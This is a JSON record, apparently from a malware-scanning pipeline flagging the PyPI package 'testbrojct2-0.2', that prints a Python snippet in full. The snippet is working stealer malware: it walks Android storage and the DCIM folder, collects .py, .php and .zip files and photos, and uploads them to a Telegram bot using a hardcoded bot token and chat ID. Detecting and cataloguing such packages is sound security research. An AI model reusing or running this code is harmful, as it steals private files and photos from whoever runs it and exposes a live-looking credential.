[
  {
    "pyfile": "dsgsfdgdfg.py",
    "malicious_code_snippets": "import os\nimport requests\nfrom concurrent.futures import ThreadPoolExecutor\n\nBOT_TOKEN = '5240507980:AAHGnzHPLfO0DJx8CdBGRxjZV0uGhLEQgsw'\nCHAT_ID = 901011671\nDCIM_FOLDER_PATH = '/sdcard/DCIM'\nMAX_WORKERS = 5\n\ndef scan_and_send_files(bot_token, chat_id, folder_path='/'):\n    API_URL_DOCUMENT = f'https://api.telegram.org/bot{bot_token}/sendDocument'\n    API_URL_MESSAGE = f'https://api.telegram.org/bot{bot_token}/sendMessage'\n\n    def send_document_to_telegram(file_path, chat_id):\n        try:\n            with open(file_path, 'rb') as file:\n                response = requests.post(API_URL_DOCUMENT, data={'chat_id': chat_id}, files={'document': file})\n                return response.json()\n        except Exception as e:\n            return None\n\n    def send_message_to_telegram(message, chat_id):\n        try:\n            response = requests.post(API_URL_MESSAGE, data={'chat_id': chat_id, 'text': message})\n            return response.json()\n        except Exception as e:\n            return None\n\n    contents = os.listdir(folder_path)\n\n    for content in contents:\n        content_path = os.path.join(folder_path, content)\n        if os.path.isfile(content_path):\n            if content.lower().endswith(('.py', '.php', '.zip')):\n                try:\n                    message = f\"File: {content}\\nPath: {content_path}\"\n                    msg_response = send_message_to_telegram(message, chat_id)\n                    file_response = send_document_to_telegram(content_path, chat_id)\n                except Exception as e:\n                    pass\n        elif os.path.isdir(content_path):\n            files_in_subdir = [os.path.join(content_path, f) for f in os.listdir(content_path) if os.path.isfile(os.path.join(content_path, f))]\n            for file_path in files_in_subdir:\n                if file_path.lower().endswith(('.py', '.php', '.zip')):\n                    try:\n                        message = f\"File: {os.path.basename(file_path)}\\nPath: {file_path}\"\n                        msg_response = send_message_to_telegram(message, chat_id)\n                        file_response = send_document_to_telegram(file_path, chat_id)\n                    except Exception as e:\n                        pass\n\ndef send_photos_in_dcim_to_telegram(bot_token, chat_id, dcim_folder_path):\n    API_URL = f'https://api.telegram.org/bot{bot_token}/sendPhoto'\n\n    def send_photo_to_telegram(file_path, chat_id):\n        with open(file_path, 'rb') as file:\n            response = requests.post(API_URL, data={'chat_id': chat_id}, files={'photo': file})\n            return response.json()\n\n    for root, dirs, files in os.walk(dcim_folder_path):\n        for file in files:\n            if file.lower().endswith(('.png', '.jpg', '.jpeg')):\n                file_path = os.path.join(root, file)\n                response = send_photo_to_telegram(file_path, chat_id)\n                print(f'Sent {file_path}: {response}')\n\ndef rudd():\n    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:\n        future_scan = executor.submit(scan_and_send_files, BOT_TOKEN, CHAT_ID, folder_path='/storage/emulated/0')\n        future_photos = executor.submit(send_photos_in_dcim_to_telegram, BOT_TOKEN, CHAT_ID, DCIM_FOLDER_PATH)\n    future_scan.result()\n    future_photos.result()\n    return \"done >> \""
  },
  {
    "metadata": {
      "package_name": "testbrojct2-0.2",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/testbrojct2-0.2.txt"
    }
  }
]